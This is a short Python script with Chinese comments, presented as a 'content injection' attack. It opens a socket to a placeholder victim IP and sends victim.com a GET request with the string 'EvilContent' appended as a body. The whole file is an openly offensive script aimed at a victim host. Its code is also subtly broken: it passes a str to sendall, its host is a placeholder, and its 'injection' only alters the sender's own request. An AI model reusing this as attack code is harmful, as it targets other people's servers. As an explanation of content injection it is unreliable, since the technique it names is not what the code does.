import socket

def content_injection():
    #建立一個Socket物件
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    #連接受害者的IP和Port
    s.connect(("受害者IP", 80))
    
    #發送HTTP請求
    request = "GET / HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 10\r\n\r\n"
    
    #篡改HTTP請求的內容
    request = request.replace("\r\n\r\n", "\r\n\r\nEvilContent")
    
    #發送篡改後的請求
    s.sendall(request)
    
    #接收回應
    response = s.recv(4096)
    
    #印出回應
    print(response)
    
    #關閉Socket連線
    s.close()

content_injection()